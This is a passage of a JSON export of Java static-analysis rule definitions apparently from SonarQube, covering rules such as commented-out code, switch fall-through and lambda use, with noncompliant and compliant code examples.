            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "java8"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S125",
            "repo": "java",
            "name": "Sections of code should not be commented out",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>\n<p>Unused code should be deleted and can be retrieved from source control history if required.</p>",
            "mdDesc": "<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>\n<p>Unused code should be deleted and can be retrieved from source control history if required.</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "unused"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1710",
            "repo": "java",
            "name": "Annotation repetitions should not be wrapped",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Before Java 8 if you needed to use multiple instances of the same annotation, they had to be wrapped in a container annotation. With Java 8, that's\nno longer necessary, allowing for cleaner, more readable code.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@SomeAnnotations({  // Noncompliant\n  @SomeAnnotation(..a..),\n  @SomeAnnotation(..b..),\n  @SomeAnnotation(..c..),\n})\npublic class SomeClass {\n  ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@SomeAnnotation(..a..)\n@SomeAnnotation(..b..)\n@SomeAnnotation(..c..)\npublic class SomeClass {\n  ...\n}\n</pre>",
            "mdDesc": "<p>Before Java 8 if you needed to use multiple instances of the same annotation, they had to be wrapped in a container annotation. With Java 8, that's\nno longer necessary, allowing for cleaner, more readable code.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@SomeAnnotations({  // Noncompliant\n  @SomeAnnotation(..a..),\n  @SomeAnnotation(..b..),\n  @SomeAnnotation(..c..),\n})\npublic class SomeClass {\n  ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@SomeAnnotation(..a..)\n@SomeAnnotation(..b..)\n@SomeAnnotation(..c..)\npublic class SomeClass {\n  ...\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "java8"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S124",
            "repo": "java",
            "name": "Track comments matching a regular expression",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>This rule template can be used to create rules which will be triggered when the full content of a comment matches a given regular expression. Note\nthat the regular expression should be expressed using the dotall format (where the <code>.</code> character matches any character).</p>\n<p>For example, one can create a rule with the regular expression <code>.*REVIEW.*</code> to match all comment containing \"REVIEW\".</p>\n<p>Note that, in order to match REVIEW regardless of the case, the <code>(?i)</code> modifier should be prepended to the expression, as in\n<code>(?i).*REVIEW.*</code>.</p>",
            "mdDesc": "<p>This rule template can be used to create rules which will be triggered when the full content of a comment matches a given regular expression. Note\nthat the regular expression should be expressed using the dotall format (where the <code>.</code> character matches any character).</p>\n<p>For example, one can create a rule with the regular expression <code>.*REVIEW.*</code> to match all comment containing \"REVIEW\".</p>\n<p>Note that, in order to match REVIEW regardless of the case, the <code>(?i)</code> modifier should be prepended to the expression, as in\n<code>(?i).*REVIEW.*</code>.</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": true,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "regularExpression",
                    "htmlDesc": "The regular expression",
                    "type": "STRING"
                },
                {
                    "key": "message",
                    "htmlDesc": "The issue message",
                    "defaultValue": "The regular expression matches this comment.",
                    "type": "STRING"
                }
            ],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S127",
            "repo": "java",
            "name": "\"for\" loop stop conditions should be invariant",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>A <code>for</code> loop stop condition should test the loop counter against an invariant value (i.e. one that is true at both the beginning and\nending of every loop iteration). Ideally, this means that the stop condition is set to a local variable just before the loop begins. </p>\n<p>Stop conditions that are not invariant are slightly less efficient, as well as being difficult to understand and maintain, and likely lead to the\nintroduction of errors in the future.</p>\n<p>This rule tracks three types of non-invariant stop conditions:</p>\n<ul>\n  <li> When the loop counters are updated in the body of the <code>for</code> loop </li>\n  <li> When the stop condition depend upon a method call </li>\n  <li> When the stop condition depends on an object property, since such properties could change during the execution of the loop. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nfor (int i = 0; i &lt; 10; i++) {\n  ...\n  i = i - 1; // Noncompliant; counter updated in the body of the loop\n  ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nfor (int i = 0; i &lt; 10; i++) {...}\n</pre>",
            "mdDesc": "<p>A <code>for</code> loop stop condition should test the loop counter against an invariant value (i.e. one that is true at both the beginning and\nending of every loop iteration). Ideally, this means that the stop condition is set to a local variable just before the loop begins. </p>\n<p>Stop conditions that are not invariant are slightly less efficient, as well as being difficult to understand and maintain, and likely lead to the\nintroduction of errors in the future.</p>\n<p>This rule tracks three types of non-invariant stop conditions:</p>\n<ul>\n  <li> When the loop counters are updated in the body of the <code>for</code> loop </li>\n  <li> When the stop condition depend upon a method call </li>\n  <li> When the stop condition depends on an object property, since such properties could change during the execution of the loop. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nfor (int i = 0; i &lt; 10; i++) {\n  ...\n  i = i - 1; // Noncompliant; counter updated in the body of the loop\n  ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nfor (int i = 0; i &lt; 10; i++) {...}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S126",
            "repo": "java",
            "name": "\"if ... else if\" constructs should end with \"else\" clauses",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>This rule applies whenever an <code>if</code> statement is followed by one or more <code>else if</code> statements; the final <code>else if</code>\nshould be followed by an <code>else</code> statement.</p>\n<p>The requirement for a final <code>else</code> statement is defensive programming.</p>\n<p>The <code>else</code> statement should either take appropriate action or contain a suitable comment as to why no action is taken. This is\nconsistent with the requirement to have a final <code>default</code> clause in a <code>switch</code> statement.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (x == 0) {\n  doSomething();\n} else if (x == 1) {\n  doSomethingElse();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (x == 0) {\n  doSomething();\n} else if (x == 1) {\n  doSomethingElse();\n} else {\n  throw new IllegalStateException();\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/RtYxBQ\">CERT, MSC01-C.</a> - Strive for logical completeness </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/jzZGBQ\">CERT, MSC57-J.</a> - Strive for logical completeness </li>\n</ul>",
            "mdDesc": "<p>This rule applies whenever an <code>if</code> statement is followed by one or more <code>else if</code> statements; the final <code>else if</code>\nshould be followed by an <code>else</code> statement.</p>\n<p>The requirement for a final <code>else</code> statement is defensive programming.</p>\n<p>The <code>else</code> statement should either take appropriate action or contain a suitable comment as to why no action is taken. This is\nconsistent with the requirement to have a final <code>default</code> clause in a <code>switch</code> statement.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (x == 0) {\n  doSomething();\n} else if (x == 1) {\n  doSomethingElse();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (x == 0) {\n  doSomething();\n} else if (x == 1) {\n  doSomethingElse();\n} else {\n  throw new IllegalStateException();\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/RtYxBQ\">CERT, MSC01-C.</a> - Strive for logical completeness </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/jzZGBQ\">CERT, MSC57-J.</a> - Strive for logical completeness </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S128",
            "repo": "java",
            "name": "Switch cases should end with an unconditional \"break\" statement",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When the execution is not explicitly terminated at the end of a switch case, it continues to execute the statements of the following case. While\nthis is sometimes intentional, it often is a mistake which leads to unexpected behavior. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nswitch (myVariable) {\n  case 1:\n    foo();\n    break;\n  case 2:  // Both 'doSomething()' and 'doSomethingElse()' will be executed. Is it on purpose ?\n    doSomething();\n  default:\n    doSomethingElse();\n    break;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nswitch (myVariable) {\n  case 1:\n    foo();\n    break;\n  case 2:\n    doSomething();\n    break;\n  default:\n    doSomethingElse();\n    break;\n}\n</pre>\n<h2>Exceptions</h2>\n<p>This rule is relaxed in the following cases:</p>\n<pre>\nswitch (myVariable) {\n  case 0:                                // Empty case used to specify the same behavior for a group of cases.\n  case 1:\n    doSomething();\n    break;\n  case 2:                                // Use of return statement\n    return;\n  case 3:                                // Use of throw statement\n    throw new IllegalStateException();\n  case 4:                                // Use of continue statement\n    continue;\n  default:                               // For the last case, use of break statement is optional\n    doSomethingElse();\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/484.html\">MITRE, CWE-484</a> - Omitted Break Statement in Switch </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ldYxBQ\">CERT, MSC17-C.</a> - Finish every set of statements associated with a case label with a\n  break statement </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/1DdGBQ\">CERT, MSC52-J.</a> - Finish every set of statements associated with a case label with a\n  break statement </li>\n</ul>",
            "mdDesc": "<p>When the execution is not explicitly terminated at the end of a switch case, it continues to execute the statements of the following case. While\nthis is sometimes intentional, it often is a mistake which leads to unexpected behavior. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nswitch (myVariable) {\n  case 1:\n    foo();\n    break;\n  case 2:  // Both 'doSomething()' and 'doSomethingElse()' will be executed. Is it on purpose ?\n    doSomething();\n  default:\n    doSomethingElse();\n    break;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nswitch (myVariable) {\n  case 1:\n    foo();\n    break;\n  case 2:\n    doSomething();\n    break;\n  default:\n    doSomethingElse();\n    break;\n}\n</pre>\n<h2>Exceptions</h2>\n<p>This rule is relaxed in the following cases:</p>\n<pre>\nswitch (myVariable) {\n  case 0:                                // Empty case used to specify the same behavior for a group of cases.\n  case 1:\n    doSomething();\n    break;\n  case 2:                                // Use of return statement\n    return;\n  case 3:                                // Use of throw statement\n    throw new IllegalStateException();\n  case 4:                                // Use of continue statement\n    continue;\n  default:                               // For the last case, use of break statement is optional\n    doSomethingElse();\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/484.html\">MITRE, CWE-484</a> - Omitted Break Statement in Switch </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ldYxBQ\">CERT, MSC17-C.</a> - Finish every set of statements associated with a case label with a\n  break statement </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/1DdGBQ\">CERT, MSC52-J.</a> - Finish every set of statements associated with a case label with a\n  break statement </li>\n</ul>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "suspicious"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1607",
            "repo": "java",
            "name": "JUnit4 @Ignored and JUnit5 @Disabled annotations should be used to disable tests and should provide a rationale",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When a test fails due, for example, to infrastructure issues, you might want to ignore it temporarily. But without some kind of notation about why\nthe test is being ignored, it may never be reactivated. Such tests are difficult to address without comprehensive knowledge of the project, and end up\npolluting their projects.</p>\n<p>This rule raises an issue for each ignored test that does not have any comment about why it is being skipped.</p>\n<ul>\n  <li> For Junit4, this rule targets the @Ignore annotation. </li>\n  <li> For Junit5, this rule targets the @Disabled annotation. </li>\n  <li> Cases where assumeTrue(false) or assumeFalse(true) are used to skip tests are targeted as well. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Ignore  // Noncompliant\n@Test\npublic void testDoTheThing() {\n  // ...\n</pre>\n<p>or</p>\n<pre>\n@Test\npublic void testDoTheThing() {\n  Assume.assumeFalse(true); // Noncompliant\n  // ...\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Test\n@Ignore(\"See Ticket #1234\")\npublic void testDoTheThing() {\n  // ...\n</pre>",
            "mdDesc": "<p>When a test fails due, for example, to infrastructure issues, you might want to ignore it temporarily. But without some kind of notation about why\nthe test is being ignored, it may never be reactivated. Such tests are difficult to address without comprehensive knowledge of the project, and end up\npolluting their projects.</p>\n<p>This rule raises an issue for each ignored test that does not have any comment about why it is being skipped.</p>\n<ul>\n  <li> For Junit4, this rule targets the @Ignore annotation. </li>\n  <li> For Junit5, this rule targets the @Disabled annotation. </li>\n  <li> Cases where assumeTrue(false) or assumeFalse(true) are used to skip tests are targeted as well. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Ignore  // Noncompliant\n@Test\npublic void testDoTheThing() {\n  // ...\n</pre>\n<p>or</p>\n<pre>\n@Test\npublic void testDoTheThing() {\n  Assume.assumeFalse(true); // Noncompliant\n  // ...\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Test\n@Ignore(\"See Ticket #1234\")\npublic void testDoTheThing() {\n  // ...\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "bad-practice",
                "confusing",
                "junit",
                "suspicious",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5194",
            "repo": "java",
            "name": "Use Java 12 \"switch\" expression",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Many existing switch statements are essentially simulations of switch expressions, where each arm either assigns to a common target variable or\nreturns a value. Expressing this as a statement is roundabout, repetitive, and error-prone.</p>\n<p>Java 12 added support for switch expressions, which provide more succinct and less error-prone version of switch.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid day_of_week(DoW day) {\n    int numLetters;\n    switch (day) {  // Noncompliant\n      case MONDAY:\n      case FRIDAY:\n      case SUNDAY:\n        numLetters = 6;\n        break;\n      case TUESDAY:\n        numLetters = 7;\n        break;\n      case THURSDAY:\n      case SATURDAY:\n        numLetters = 8;\n        break;\n      case WEDNESDAY:\n        numLetters = 9;\n        break;\n      default:\n        throw new IllegalStateException(\"Wat: \" + day);\n    }\n}\n\nint return_switch(int x) {\n    switch (x) { // Noncompliant\n      case 1:\n        return 1;\n      case 2:\n        return 2;\n      default:\n        throw new IllegalStateException();\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint numLetters = switch (day) {\n    case MONDAY, FRIDAY, SUNDAY -&gt; 6;\n    case TUESDAY                -&gt; 7;\n    case THURSDAY, SATURDAY     -&gt; 8;\n    case WEDNESDAY              -&gt; 9;\n};\n</pre>",
            "mdDesc": "<p>Many existing switch statements are essentially simulations of switch expressions, where each arm either assigns to a common target variable or\nreturns a value. Expressing this as a statement is roundabout, repetitive, and error-prone.</p>\n<p>Java 12 added support for switch expressions, which provide more succinct and less error-prone version of switch.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid day_of_week(DoW day) {\n    int numLetters;\n    switch (day) {  // Noncompliant\n      case MONDAY:\n      case FRIDAY:\n      case SUNDAY:\n        numLetters = 6;\n        break;\n      case TUESDAY:\n        numLetters = 7;\n        break;\n      case THURSDAY:\n      case SATURDAY:\n        numLetters = 8;\n        break;\n      case WEDNESDAY:\n        numLetters = 9;\n        break;\n      default:\n        throw new IllegalStateException(\"Wat: \" + day);\n    }\n}\n\nint return_switch(int x) {\n    switch (x) { // Noncompliant\n      case 1:\n        return 1;\n      case 2:\n        return 2;\n      default:\n        throw new IllegalStateException();\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint numLetters = switch (day) {\n    case MONDAY, FRIDAY, SUNDAY -&gt; 6;\n    case TUESDAY                -&gt; 7;\n    case THURSDAY, SATURDAY     -&gt; 8;\n    case WEDNESDAY              -&gt; 9;\n};\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "java12"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1604",
            "repo": "java",
            "name": "Anonymous inner classes containing only one method should become lambdas",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Before Java 8, the only way to partially support closures in Java was by using anonymous inner classes. But the syntax of anonymous classes may\nseem unwieldy and unclear.</p>\n<p>With Java 8, most uses of anonymous inner classes should be replaced by lambdas to highly increase the readability of the source code.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nmyCollection.stream().map(new Mapper&lt;String,String&gt;() {\n  public String map(String input) {\n    return new StringBuilder(input).reverse().toString();\n  }\n});\n\nPredicate&lt;String&gt; isEmpty = new Predicate&lt;String&gt; {\n    boolean test(String myString) {\n        return myString.isEmpty();\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nmyCollection.stream().map(input -&gt; new StringBuilder(input).reverse().toString());\n\nPredicate&lt;String&gt; isEmpty = myString -&gt; myString.isEmpty();\n</pre>",
            "mdDesc": "<p>Before Java 8, the only way to partially support closures in Java was by using anonymous inner classes. But the syntax of anonymous classes may\nseem unwieldy and unclear.</p>\n<p>With Java 8, most uses of anonymous inner classes should be replaced by lambdas to highly increase the readability of the source code.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nmyCollection.stream().map(new Mapper&lt;String,String&gt;() {\n  public String map(String input) {\n    return new StringBuilder(input).reverse().toString();\n  }\n});\n\nPredicate&lt;String&gt; isEmpty = new Predicate&lt;String&gt; {\n    boolean test(String myString) {\n        return myString.isEmpty();\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nmyCollection.stream().map(input -&gt; new StringBuilder(input).reverse().toString());\n\nPredicate&lt;String&gt; isEmpty = myString -&gt; myString.isEmpty();\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "java8"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1849",
            "repo": "java",
            "name": "\"Iterator.hasNext()\" should not call \"Iterator.next()\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Calling <code>Iterator.hasNext()</code> is not supposed to have any side effects, and therefore should not change the state of the iterator.\n<code>Iterator.next()</code> advances the iterator by one item. So calling it inside <code>Iterator.hasNext()</code>, breaks the\n<code>hasNext()</code> contract, and will lead to unexpected behavior in production.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class FibonacciIterator implements Iterator&lt;Integer&gt;{\n...\n@Override\npublic boolean hasNext() {\n  if(next() != null) {\n    return true;\n  }\n  return false;\n}\n...\n}\n</pre>",
            "mdDesc": "<p>Calling <code>Iterator.hasNext()</code> is not supposed to have any side effects, and therefore should not change the state of the iterator.\n<code>Iterator.next()</code> advances the iterator by one item. So calling it inside <code>Iterator.hasNext()</code>, breaks the\n<code>hasNext()</code> contract, and will lead to unexpected behavior in production.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class FibonacciIterator implements Iterator&lt;Integer&gt;{\n...\n@Override\npublic boolean hasNext() {\n  if(next() != null) {\n    return true;\n  }\n  return false;\n}\n...\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1844",
            "repo": "java",
            "name": "\"Object.wait(...)\" should never be called on objects that implement \"java.util.concurrent.locks.Condition\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>From the Java API documentation:</p>\n<blockquote>\n  <p><code>Condition</code> factors out the <code>Object</code> monitor methods (<code>wait</code>, <code>notify</code> and <code>notifyAll</code>)\n  into distinct objects to give the effect of having multiple wait-sets per object, by combining them with the use of arbitrary Lock implementations.\n  Where a <code>Lock</code> replaces the use of <code>synchronized</code> methods and statements, a <code>Condition</code> replaces the use of the\n  <code>Object</code> monitor methods.</p>\n</blockquote>\n<p>The purpose of implementing the <code>Condition</code> interface is to gain access to its more nuanced <code>await</code> methods. Therefore,\ncalling the method <code>Object.wait(...)</code> on a class implementing the <code>Condition</code> interface is silly and confusing.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nfinal Lock lock = new ReentrantLock();\nfinal Condition notFull  = lock.newCondition();\n...\nnotFull.wait();\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nfinal Lock lock = new ReentrantLock();\nfinal Condition notFull  = lock.newCondition();\n...\nnotFull.await();\n</pre>",
            "mdDesc": "<p>From the Java API documentation:</p>\n<blockquote>\n  <p><code>Condition</code> factors out the <code>Object</code> monitor methods (<code>wait</code>, <code>notify</code> and <code>notifyAll</code>)\n  into distinct objects to give the effect of having multiple wait-sets per object, by combining them with the use of arbitrary Lock implementations.\n  Where a <code>Lock</code> replaces the use of <code>synchronized</code> methods and statements, a <code>Condition</code> replaces the use of the\n  <code>Object</code> monitor methods.</p>\n</blockquote>\n<p>The purpose of implementing the <code>Condition</code> interface is to gain access to its more nuanced <code>await</code> methods. Therefore,\ncalling the method <code>Object.wait(...)</code> on a class implementing the <code>Condition</code> interface is silly and confusing.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nfinal Lock lock = new ReentrantLock();\nfinal Condition notFull  = lock.newCondition();\n...\nnotFull.wait();\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nfinal Lock lock = new ReentrantLock();\nfinal Condition notFull  = lock.newCondition();\n...\nnotFull.await();\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "suspicious"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1845",
            "repo": "java",
            "name": "Methods and field names should not be the same or differ only by capitalization",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Looking at the set of methods in a class, including superclass methods, and finding two methods or fields that differ only by capitalization is\nconfusing to users of the class. It is similarly confusing to have a method and a field which differ only in capitalization or a method and a field\nwith exactly the same name and visibility.</p>\n<p>In the case of methods, it may have been a mistake on the part of the original developer, who intended to override a superclass method, but instead\nadded a new method with nearly the same name.</p>\n<p>Otherwise, this situation simply indicates poor naming. Method names should be action-oriented, and thus contain a verb, which is unlikely in the\ncase where both a method and a member have the same name (with or without capitalization differences). However, renaming a public method could be\ndisruptive to callers. Therefore renaming the member is the recommended action.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Car{\n\n  public DriveTrain drive;\n\n  public void tearDown(){...}\n\n  public void drive() {...}  // Noncompliant; duplicates field name\n}\n\npublic class MyCar extends Car{\n  public void teardown(){...}  // Noncompliant; not an override. It it really what's intended?\n\n  public void drivefast(){...}\n\n  public void driveFast(){...} //Huh?\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Car{\n\n  private DriveTrain drive;\n\n  public void tearDown(){...}\n\n  public void drive() {...}  // field visibility reduced\n}\n\npublic class MyCar extends Car{\n  @Override\n  public void tearDown(){...}\n\n  public void drivefast(){...}\n\n  public void driveReallyFast(){...}\n\n}\n</pre>",
